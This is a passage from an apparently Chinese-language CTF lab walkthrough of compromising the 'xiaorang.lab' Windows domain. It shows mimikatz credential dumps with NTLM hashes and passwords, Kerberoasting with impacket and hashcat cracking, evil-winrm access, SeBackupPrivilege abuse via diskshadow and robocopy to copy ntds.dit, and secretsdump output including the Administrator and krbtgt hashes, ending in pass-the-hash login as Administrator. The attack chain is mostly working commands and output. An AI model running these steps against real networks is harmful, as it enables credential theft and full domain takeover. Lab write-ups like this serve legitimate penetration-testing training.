	 * Password : 98 20 01 fe 1f c2 33 3f 53 11 db 36 54 b3 01 4d d9 df 6f c1 e6 8b dd 88 38 11 e9 b3 93 b9 85 41 e0 32 f3 0f 12 19 90 0e de 5b 00 0e a8 25 1c f3 da b8 21 a0 a7 ed ce 4d 01 75 f5 8e 9b e4 6e 30 0f 31 40 d3 6f fc a9 0e 6d c2 a4 1e 2f c4 36 70 87 8a 22 99 a9 7c b8 04 fd 30 fa 6c 71 38 ab d3 9f 1f 52 a0 c1 35 2d 0b 38 df 36 49 b1 68 ae 59 b2 c0 5d 74 81 30 b8 48 d6 2a 37 07 cd 1c b9 80 7a 2d 23 aa 29 f8 a1 ff e1 9c 8a bc 38 42 34 74 48 5b 20 e4 69 db 5d f2 98 af 7c 9d 28 e8 c4 20 d1 10 51 ec 86 4c f8 56 9f db e8 ee e4 21 56 37 75 4e ec 3c 88 b0 70 c3 30 dc 5a 44 29 b3 df 8a b7 53 f3 de 2e 9c ba 17 82 5d af 65 43 a9 ec 86 ea 7f c4 ba 06 47 ed 32 75 5e 22 69 b7 f5 fa cb 43 d5 ed 70 e3 9e 93 5d 09 a5 4b 45 70 51 7e 4a 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 64679 (00000000:0000fca7)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/8/17 23:25:59
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : 8519c5a89b2cd4d679a5a36f26863e5d
	 * SHA1     : 42d8188bc30ff0880b838e368c6e5522b86f978d
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XR-0923$
	 * Domain   : xiaorang.lab
	 * Password : &H!vqg]om0Iz5Pn1NUGod&R9o /!$EK.?jn06+[J*6oZ\A+H?c2;V\(AgGpKw*f0W\vdUf;QoJ/5#DRZDwR@W5U9Io8`;zE7L":Ay-SKpe#>5S?;IL'HarDD
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : XR-0923$
Domain            : XIAORANG
Logon Server      : (null)
Logon Time        : 2023/8/17 23:25:58
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : ca4b01dd584a3176ca01a347b55b9c2b
	 * SHA1     : 6ed78a686ad7c13f320588fd619a1aca8118f462
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : xr-0923$
	 * Domain   : XIAORANG.LAB
	 * Password : 98 20 01 fe 1f c2 33 3f 53 11 db 36 54 b3 01 4d d9 df 6f c1 e6 8b dd 88 38 11 e9 b3 93 b9 85 41 e0 32 f3 0f 12 19 90 0e de 5b 00 0e a8 25 1c f3 da b8 21 a0 a7 ed ce 4d 01 75 f5 8e 9b e4 6e 30 0f 31 40 d3 6f fc a9 0e 6d c2 a4 1e 2f c4 36 70 87 8a 22 99 a9 7c b8 04 fd 30 fa 6c 71 38 ab d3 9f 1f 52 a0 c1 35 2d 0b 38 df 36 49 b1 68 ae 59 b2 c0 5d 74 81 30 b8 48 d6 2a 37 07 cd 1c b9 80 7a 2d 23 aa 29 f8 a1 ff e1 9c 8a bc 38 42 34 74 48 5b 20 e4 69 db 5d f2 98 af 7c 9d 28 e8 c4 20 d1 10 51 ec 86 4c f8 56 9f db e8 ee e4 21 56 37 75 4e ec 3c 88 b0 70 c3 30 dc 5a 44 29 b3 df 8a b7 53 f3 de 2e 9c ba 17 82 5d af 65 43 a9 ec 86 ea 7f c4 ba 06 47 ed 32 75 5e 22 69 b7 f5 fa cb 43 d5 ed 70 e3 9e 93 5d 09 a5 4b 45 70 51 7e 4a 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 33772 (00000000:000083ec)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2023/8/17 23:25:58
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : ca4b01dd584a3176ca01a347b55b9c2b
	 * SHA1     : 6ed78a686ad7c13f320588fd619a1aca8118f462
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XR-0923$
	 * Domain   : xiaorang.lab
	 * Password : 98 20 01 fe 1f c2 33 3f 53 11 db 36 54 b3 01 4d d9 df 6f c1 e6 8b dd 88 38 11 e9 b3 93 b9 85 41 e0 32 f3 0f 12 19 90 0e de 5b 00 0e a8 25 1c f3 da b8 21 a0 a7 ed ce 4d 01 75 f5 8e 9b e4 6e 30 0f 31 40 d3 6f fc a9 0e 6d c2 a4 1e 2f c4 36 70 87 8a 22 99 a9 7c b8 04 fd 30 fa 6c 71 38 ab d3 9f 1f 52 a0 c1 35 2d 0b 38 df 36 49 b1 68 ae 59 b2 c0 5d 74 81 30 b8 48 d6 2a 37 07 cd 1c b9 80 7a 2d 23 aa 29 f8 a1 ff e1 9c 8a bc 38 42 34 74 48 5b 20 e4 69 db 5d f2 98 af 7c 9d 28 e8 c4 20 d1 10 51 ec 86 4c f8 56 9f db e8 ee e4 21 56 37 75 4e ec 3c 88 b0 70 c3 30 dc 5a 44 29 b3 df 8a b7 53 f3 de 2e 9c ba 17 82 5d af 65 43 a9 ec 86 ea 7f c4 ba 06 47 ed 32 75 5e 22 69 b7 f5 fa cb 43 d5 ed 70 e3 9e 93 5d 09 a5 4b 45 70 51 7e 4a 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 3119635 (00000000:002f9a13)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/8/17 23:43:12
SID               : S-1-5-90-0-3
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : ca4b01dd584a3176ca01a347b55b9c2b
	 * SHA1     : 6ed78a686ad7c13f320588fd619a1aca8118f462
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XR-0923$
	 * Domain   : xiaorang.lab
	 * Password : 98 20 01 fe 1f c2 33 3f 53 11 db 36 54 b3 01 4d d9 df 6f c1 e6 8b dd 88 38 11 e9 b3 93 b9 85 41 e0 32 f3 0f 12 19 90 0e de 5b 00 0e a8 25 1c f3 da b8 21 a0 a7 ed ce 4d 01 75 f5 8e 9b e4 6e 30 0f 31 40 d3 6f fc a9 0e 6d c2 a4 1e 2f c4 36 70 87 8a 22 99 a9 7c b8 04 fd 30 fa 6c 71 38 ab d3 9f 1f 52 a0 c1 35 2d 0b 38 df 36 49 b1 68 ae 59 b2 c0 5d 74 81 30 b8 48 d6 2a 37 07 cd 1c b9 80 7a 2d 23 aa 29 f8 a1 ff e1 9c 8a bc 38 42 34 74 48 5b 20 e4 69 db 5d f2 98 af 7c 9d 28 e8 c4 20 d1 10 51 ec 86 4c f8 56 9f db e8 ee e4 21 56 37 75 4e ec 3c 88 b0 70 c3 30 dc 5a 44 29 b3 df 8a b7 53 f3 de 2e 9c ba 17 82 5d af 65 43 a9 ec 86 ea 7f c4 ba 06 47 ed 32 75 5e 22 69 b7 f5 fa cb 43 d5 ed 70 e3 9e 93 5d 09 a5 4b 45 70 51 7e 4a 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 3119165 (00000000:002f983d)
Session           : Interactive from 3
User Name         : DWM-3
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/8/17 23:43:12
SID               : S-1-5-90-0-3
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : ca4b01dd584a3176ca01a347b55b9c2b
	 * SHA1     : 6ed78a686ad7c13f320588fd619a1aca8118f462
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XR-0923$
	 * Domain   : xiaorang.lab
	 * Password : 98 20 01 fe 1f c2 33 3f 53 11 db 36 54 b3 01 4d d9 df 6f c1 e6 8b dd 88 38 11 e9 b3 93 b9 85 41 e0 32 f3 0f 12 19 90 0e de 5b 00 0e a8 25 1c f3 da b8 21 a0 a7 ed ce 4d 01 75 f5 8e 9b e4 6e 30 0f 31 40 d3 6f fc a9 0e 6d c2 a4 1e 2f c4 36 70 87 8a 22 99 a9 7c b8 04 fd 30 fa 6c 71 38 ab d3 9f 1f 52 a0 c1 35 2d 0b 38 df 36 49 b1 68 ae 59 b2 c0 5d 74 81 30 b8 48 d6 2a 37 07 cd 1c b9 80 7a 2d 23 aa 29 f8 a1 ff e1 9c 8a bc 38 42 34 74 48 5b 20 e4 69 db 5d f2 98 af 7c 9d 28 e8 c4 20 d1 10 51 ec 86 4c f8 56 9f db e8 ee e4 21 56 37 75 4e ec 3c 88 b0 70 c3 30 dc 5a 44 29 b3 df 8a b7 53 f3 de 2e 9c ba 17 82 5d af 65 43 a9 ec 86 ea 7f c4 ba 06 47 ed 32 75 5e 22 69 b7 f5 fa cb 43 d5 ed 70 e3 9e 93 5d 09 a5 4b 45 70 51 7e 4a 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 1334687 (00000000:00145d9f)
Session           : Interactive from 2
User Name         : zhangshuai
Domain            : XR-0923
Logon Server      : XR-0923
Logon Time        : 2023/8/17 23:30:45
SID               : S-1-5-21-754105099-1176710061-2177073800-1001
	msv :	
	 [00000003] Primary
	 * Username : zhangshuai
	 * Domain   : XR-0923
	 * NTLM     : f97d5a4b44b11bc257a63c3f76f18a9a
	 * SHA1     : f6ff2714d556240436758527e190e329f05cd43d
	tspkg :	
	wdigest :	
	 * Username : zhangshuai
	 * Domain   : XR-0923
	 * Password : (null)
	kerberos :	
	 * Username : zhangshuai
	 * Domain   : XR-0923
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 652716 (00000000:0009f5ac)
Session           : RemoteInteractive from 2
User Name         : zhangshuai
Domain            : XR-0923
Logon Server      : XR-0923
Logon Time        : 2023/8/17 23:29:10
SID               : S-1-5-21-754105099-1176710061-2177073800-1001
	msv :	
	 [00000003] Primary
	 * Username : zhangshuai
	 * Domain   : XR-0923
	 * NTLM     : f97d5a4b44b11bc257a63c3f76f18a9a
	 * SHA1     : f6ff2714d556240436758527e190e329f05cd43d
	tspkg :	
	wdigest :	
	 * Username : zhangshuai
	 * Domain   : XR-0923
	 * Password : (null)
	kerberos :	
	 * Username : zhangshuai
	 * Domain   : XR-0923
	 * Password : wSbEajHzZs
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2023/8/17 23:26:01
SID               : S-1-5-17
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2023/8/17 23:25:59
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 64660 (00000000:0000fc94)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2023/8/17 23:25:59
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : ca4b01dd584a3176ca01a347b55b9c2b
	 * SHA1     : 6ed78a686ad7c13f320588fd619a1aca8118f462
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XR-0923$
	 * Domain   : xiaorang.lab
	 * Password : 98 20 01 fe 1f c2 33 3f 53 11 db 36 54 b3 01 4d d9 df 6f c1 e6 8b dd 88 38 11 e9 b3 93 b9 85 41 e0 32 f3 0f 12 19 90 0e de 5b 00 0e a8 25 1c f3 da b8 21 a0 a7 ed ce 4d 01 75 f5 8e 9b e4 6e 30 0f 31 40 d3 6f fc a9 0e 6d c2 a4 1e 2f c4 36 70 87 8a 22 99 a9 7c b8 04 fd 30 fa 6c 71 38 ab d3 9f 1f 52 a0 c1 35 2d 0b 38 df 36 49 b1 68 ae 59 b2 c0 5d 74 81 30 b8 48 d6 2a 37 07 cd 1c b9 80 7a 2d 23 aa 29 f8 a1 ff e1 9c 8a bc 38 42 34 74 48 5b 20 e4 69 db 5d f2 98 af 7c 9d 28 e8 c4 20 d1 10 51 ec 86 4c f8 56 9f db e8 ee e4 21 56 37 75 4e ec 3c 88 b0 70 c3 30 dc 5a 44 29 b3 df 8a b7 53 f3 de 2e 9c ba 17 82 5d af 65 43 a9 ec 86 ea 7f c4 ba 06 47 ed 32 75 5e 22 69 b7 f5 fa cb 43 d5 ed 70 e3 9e 93 5d 09 a5 4b 45 70 51 7e 4a 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 33733 (00000000:000083c5)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2023/8/17 23:25:58
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : ca4b01dd584a3176ca01a347b55b9c2b
	 * SHA1     : 6ed78a686ad7c13f320588fd619a1aca8118f462
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : XR-0923$
	 * Domain   : xiaorang.lab
	 * Password : 98 20 01 fe 1f c2 33 3f 53 11 db 36 54 b3 01 4d d9 df 6f c1 e6 8b dd 88 38 11 e9 b3 93 b9 85 41 e0 32 f3 0f 12 19 90 0e de 5b 00 0e a8 25 1c f3 da b8 21 a0 a7 ed ce 4d 01 75 f5 8e 9b e4 6e 30 0f 31 40 d3 6f fc a9 0e 6d c2 a4 1e 2f c4 36 70 87 8a 22 99 a9 7c b8 04 fd 30 fa 6c 71 38 ab d3 9f 1f 52 a0 c1 35 2d 0b 38 df 36 49 b1 68 ae 59 b2 c0 5d 74 81 30 b8 48 d6 2a 37 07 cd 1c b9 80 7a 2d 23 aa 29 f8 a1 ff e1 9c 8a bc 38 42 34 74 48 5b 20 e4 69 db 5d f2 98 af 7c 9d 28 e8 c4 20 d1 10 51 ec 86 4c f8 56 9f db e8 ee e4 21 56 37 75 4e ec 3c 88 b0 70 c3 30 dc 5a 44 29 b3 df 8a b7 53 f3 de 2e 9c ba 17 82 5d af 65 43 a9 ec 86 ea 7f c4 ba 06 47 ed 32 75 5e 22 69 b7 f5 fa cb 43 d5 ed 70 e3 9e 93 5d 09 a5 4b 45 70 51 7e 4a 
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 32617 (00000000:00007f69)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2023/8/17 23:25:58
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * NTLM     : ca4b01dd584a3176ca01a347b55b9c2b
	 * SHA1     : 6ed78a686ad7c13f320588fd619a1aca8118f462
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : XR-0923$
Domain            : XIAORANG
Logon Server      : (null)
Logon Time        : 2023/8/17 23:25:58
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : XR-0923$
	 * Domain   : XIAORANG
	 * Password : (null)
	kerberos :	
	 * Username : xr-0923$
	 * Domain   : XIAORANG.LAB
	 * Password : 98 20 01 fe 1f c2 33 3f 53 11 db 36 54 b3 01 4d d9 df 6f c1 e6 8b dd 88 38 11 e9 b3 93 b9 85 41 e0 32 f3 0f 12 19 90 0e de 5b 00 0e a8 25 1c f3 da b8 21 a0 a7 ed ce 4d 01 75 f5 8e 9b e4 6e 30 0f 31 40 d3 6f fc a9 0e 6d c2 a4 1e 2f c4 36 70 87 8a 22 99 a9 7c b8 04 fd 30 fa 6c 71 38 ab d3 9f 1f 52 a0 c1 35 2d 0b 38 df 36 49 b1 68 ae 59 b2 c0 5d 74 81 30 b8 48 d6 2a 37 07 cd 1c b9 80 7a 2d 23 aa 29 f8 a1 ff e1 9c 8a bc 38 42 34 74 48 5b 20 e4 69 db 5d f2 98 af 7c 9d 28 e8 c4 20 d1 10 51 ec 86 4c f8 56 9f db e8 ee e4 21 56 37 75 4e ec 3c 88 b0 70 c3 30 dc 5a 44 29 b3 df 8a b7 53 f3 de 2e 9c ba 17 82 5d af 65 43 a9 ec 86 ea 7f c4 ba 06 47 ed 32 75 5e 22 69 b7 f5 fa cb 43 d5 ed 70 e3 9e 93 5d 09 a5 4b 45 70 51 7e 4a 
	ssp :	
	credman :	
	cloudap :	

mimikatz # 
```

拿着 `XR-0923$` 机器账户的凭据去收集信息

kerberoasting

```shell
$ proxychains getUserSPNs.py xiaorang.lab/'XR-0923$' -hashes ':ca4b01dd584a3176ca01a347b55b9c2b' -dc-ip 172.22.14.11
Impacket v0.12.0.dev1+20230803.144057.e2092339 - Copyright 2023 Fortra

ServicePrincipalName           Name      MemberOf                                                  PasswordLastSet             LastLogon  Delegation
-----------------------------  --------  --------------------------------------------------------  --------------------------  ---------  ----------
TERMSERV/xr-0923.xiaorang.lab  tianjing  CN=Remote Management Users,CN=Builtin,DC=xiaorang,DC=lab  2023-05-30 18:25:11.564883  <never>
WWW/xr-0923.xiaorang.lab/IIS   tianjing  CN=Remote Management Users,CN=Builtin,DC=xiaorang,DC=lab  2023-05-30 18:25:11.564883  <never>
```

request

```shell
➜ ~ proxychains getUserSPNs.py xiaorang.lab/'XR-0923$' -hashes ':ca4b01dd584a3176ca01a347b55b9c2b' -dc-ip 172.22.14.11 -request-user tianjing
Impacket v0.12.0.dev1+20230803.144057.e2092339 - Copyright 2023 Fortra

ServicePrincipalName           Name      MemberOf                                                  PasswordLastSet             LastLogon  Delegation
-----------------------------  --------  --------------------------------------------------------  --------------------------  ---------  ----------
TERMSERV/xr-0923.xiaorang.lab  tianjing  CN=Remote Management Users,CN=Builtin,DC=xiaorang,DC=lab  2023-05-30 18:25:11.564883  <never>
WWW/xr-0923.xiaorang.lab/IIS   tianjing  CN=Remote Management Users,CN=Builtin,DC=xiaorang,DC=lab  2023-05-30 18:25:11.564883  <never>



[-] CCache file is not found. Skipping...
$krb5tgs$23$*tianjing$XIAORANG.LAB$xiaorang.lab/tianjing*$1d0f50710edce36c22e32d9c9f615388$1b103fe1617c8cb1ec3e3e50382a64af024922106756123b6c374fa88baa33a6891e41d9ff5a2d0780ce6f7890e05ad32704a85802289e0478df455dc9d86353534edaa620ebb9b798244597c23602121973d4f4cb17edf083d4e32415cfd80af4b8c57dbb2895c028bea8bcce835a77249de8e99bd752ada391ec3aac9030dca55586e854e334a34cc13961d6d39980bb0872fa7cbf927634047efe10027145430cee08610874635b8da8c9e27623a83887ccf4162c04b0370c0d1ad4e6a6f6d45b862237044ba5e75a60eb77e7675d70a767bc2cda32618ac845a8a35b58ea8786fca8d5f03d433eb5315a0c6fc8d0e08d8999a20adcddb2f76d54261fd0f9c75a46e4570b26844f207a0b527f1d55a2f1658e8020f1673296cf8bd10c365c06086312aba0c0e7b4a1f2e9588686b393e34cb50181cd42898962a4abbcde976350b8ae08f303636e4f4c6805256c70a06c577dfa707f3d381f5788251bd9818e7cfff08501bb7d130bb5eaa4e1e8c25eabe5d8074927f5ada4388b773734de1f6f2ad02059f0c4a1bf750350e3bd371b8d91f0ef01b1832b9878082fe662deca5d75bc0bce608f3dfa3477d45010ab5b8eb4ebb77c804e818de6e0777c187ef80e4a51a9062dbeeb3104516883689165ec25cd39c7da06e67c021907359bdf8b8f3050f446f335e9a0197779aeb64372d8acdff23ab579ef851e5d6663cffdfed42a94a3b47c80d7120b8fe5ac005b545b92459b0df8d704f5f27c7f7642e3492d51a9bfef2c001f20ece41ea4c7271acf90fea5454378af37f3767abf4008047b32d53915a9b5da6b7d4c68947c231eaf8445c2f01f329a9a9cd2967aadd8fc1a26df7bc9f1cf087fe7f241ead1623a92c5640dbedecc243e36e7b2ff09bb57833df8c4a5ba2db69dfba0b270b95bfa9ec87c1a8f8b3f8b4fb50d9a6c2148352b543afce647980dbf051d3fb48fb0cb2594f4b0cb003dfab8fb755e5ae32280cc0e1736319590bcc070f05810b670e19be22054ad4e1e3880fb6e259185db76efa74e356c8cd8beec83c4f44ff5e49f1b1a61f05ba76a4e48fe63d5316418c3bf99bfa50d9e10f65323e015076a48ddebcd697adc0e563e762d015bcc98ef1dd3303aa59e98c8d2d6f5abf1776d344623cdd7a382b71e4971b2d62383e725b7f1dec1d3bd3d2523b12990d841176fd5e0fc610dafbfbd85edc2a584f5e6a6a6b9a9e34dfd3f4e981a44849a89330c142f16f87cd7e7ec4fbe4b447f431b0bdadfed48b35830ca241cf028238bf837f061a93560e72f11a9b31179934c132051737725c3d4c475743080298877b801734e518f3838f366a81910a40a748afee84b923616deb708450a974ac6108ce5626bd6d6dc14744b9aa3dce6fde60b34936fe081c8e3a879adec2da5c1c0f61cb95b865222e473bbddf61aa44fa9c1329f125db45ff4c359e21975e83476c097aee47c5825
```

hashcat

```shell
hashcat -a 0 -m 13100 hash.txt ~/Tools/字典/rockyou.txt
```

密码为 `DPQSXSXgh2`

crackmapexec winrm

![image-20230817235358831](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308172353926.png)

连接

```shell
proxychains evil-winrm -i 172.22.14.11 -u tianjing -p DPQSXSXgh2 
```

![image-20230817235518009](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308172355101.png)

有 SeBackupPrivilege 和 SeRestorePrivilege 特权

尝试导出 sam system

```shell
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
```

![image-20230817235759489](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308172357585.png)

然后 ntds.dit 的导出这里好像只有 diskshadow 能成功?

shadow.txt

```shell
set context persistent nowriters
add volume c: alias someAlias
create
expose %someAlias% z:
exec "C:\windows\system32\cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\Users\tianjing\ntds.dit
delete shadows volume %someAlias%
reset
```

copy 的时候会提示拒绝访问

```shell
*Evil-WinRM* PS C:\Users\tianjing> diskshadow.exe /s shadow.txt
Microsoft DiskShadow 版本 1.0
版权所有 (C) 2013 Microsoft Corporation
在计算机上: XR-DC，2023/8/18 0:04:45

-> set context persistent nowriters
-> add volume c: alias someAlias
-> create
已将卷影 ID {cd397bf4-02e4-4eb3-81d7-ba89ce2fcc9d} 的别名 someAlias 设置为环境变量。
已将卷影集 ID {cecc98da-94f7-400c-aaf2-6479a7ffcf40} 的别名 VSS_SHADOW_SET 设置为环境变量。

正在查询卷影副本集 ID 为 {cecc98da-94f7-400c-aaf2-6479a7ffcf40} 的所有卷影副本

        * 卷影副本 ID = {cd397bf4-02e4-4eb3-81d7-ba89ce2fcc9d}          %someAlias%
                - 卷影副本集: {cecc98da-94f7-400c-aaf2-6479a7ffcf40}    %VSS_SHADOW_SET%
                - 卷影副本原始数 = 1
                - 原始卷名称: \\?\Volume{4790f32e-0000-0000-0000-100000000000}\ [C:\]
                - 创建时间: 2023/8/18 0:04:46
                - 卷影副本设备名称: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - 原始计算机: XR-DC.xiaorang.lab
                - 服务计算机: XR-DC.xiaorang.lab
                - 未暴露
                - 提供程序 ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - 属性:  No_Auto_Release Persistent No_Writers Differential

已列出的卷影副本数: 1
-> expose %someAlias% z:
-> %someAlias% = {cd397bf4-02e4-4eb3-81d7-ba89ce2fcc9d}
已成功将卷影副本暴露为 z:\。
-> exec "C:\windows\system32\cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\Users\tianjing\ntds.dit
diskshadow.exe : 拒绝访问。
    + CategoryInfo          : NotSpecified: (拒绝访问。:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
已复制         0 个文件。
命令脚本已返回故障退出代码 1。
命令脚本失败。
```

但是用 robocopy 就没问题了 (?)

```shell
*Evil-WinRM* PS C:\Users\tianjing> robocopy /b z:\windows\ntds\ c:\users\tianjing\ ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Windows 的可靠文件复制
-------------------------------------------------------------------------------

  开始时间: 2023年8月18日 0:05:47
        源: z:\windows\ntds\
      目标: c:\users\tianjing\

      文件: ntds.dit

      选项: /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

                           1    z:\windows\ntds\
            新文件                16.0 m        ntds.dit
0.0%
......
100%
100%

------------------------------------------------------------------------------

                  总数        复制        跳过       不匹配        失败        其他
       目录:         1         0         1         0         0         0
       文件:         1         1         0         0         0         0
       字节:   16.00 m   16.00 m         0         0         0         0
       时间:   0:00:00   0:00:00                       0:00:00   0:00:00


       速度:           136,400,130 字节/秒。
       速度:             7,804.878 MB/分钟。
   已结束: 2023年8月18日 0:05:47
```

dump

```shell
➜ ntds secretsdump.py -system system.hive -ntds ntds.dit local
Impacket v0.12.0.dev1+20230803.144057.e2092339 - Copyright 2023 Fortra

[*] Target system bootKey: 0x4d1852164a0b068f32110659820cd4bc
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 8cca939cb8a94a304d33209b41a99517
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:70c39b547b7d8adec35ad7c09fb1d277:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
XR-DC$:1000:aad3b435b51404eeaad3b435b51404ee:e6052a700e4ed5485820391f44f5e2a9:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4b2afb57dd0833ee9ed732ea89c263a3:::
XR-0923$:1103:aad3b435b51404eeaad3b435b51404ee:ca4b01dd584a3176ca01a347b55b9c2b:::
...... (略)
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:afdaee99d584caec50bfce43fb4f524e80017d7d04fdd435849a9e8a037ba399
Administrator:aes128-cts-hmac-sha1-96:17cf30f985414dfc95092429bf74fac7
Administrator:des-cbc-md5:79a1466708cd6838
XR-DC$:aes256-cts-hmac-sha1-96:d6f3d221d3880ac35779c5a9b7ca85e1db967acb5a8a7a04ee7ff85b4be87d59
XR-DC$:aes128-cts-hmac-sha1-96:8999ea107287bcd72fbae266d01ea4cb
XR-DC$:des-cbc-md5:abe5abb0c7f84f9e
krbtgt:aes256-cts-hmac-sha1-96:b2f2e630f3c12c2cc2779624a11a1406c792c8f31d145246e657b230ff9f0f09
krbtgt:aes128-cts-hmac-sha1-96:5f2c868accc1f40c80fdf7094494faf4
krbtgt:des-cbc-md5:673b2937e3cd7cab
XR-0923$:aes256-cts-hmac-sha1-96:9ab26f864daede1d736b8fc8686c3124d6d444797c0ea4284b05c584d2ac77fd
XR-0923$:aes128-cts-hmac-sha1-96:cc0fb09c75f38ac29af041c13695e73c
XR-0923$:des-cbc-md5:b6efb9d57c5b980e
...... (略)
[*] Cleaning up...
```

flag04

```shell
proxychains evil-winrm -i 172.22.14.11 -u Administrator -H '70c39b547b7d8adec35ad7c09fb1d277'
```

![image-20230818001644620](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308180016727.png)
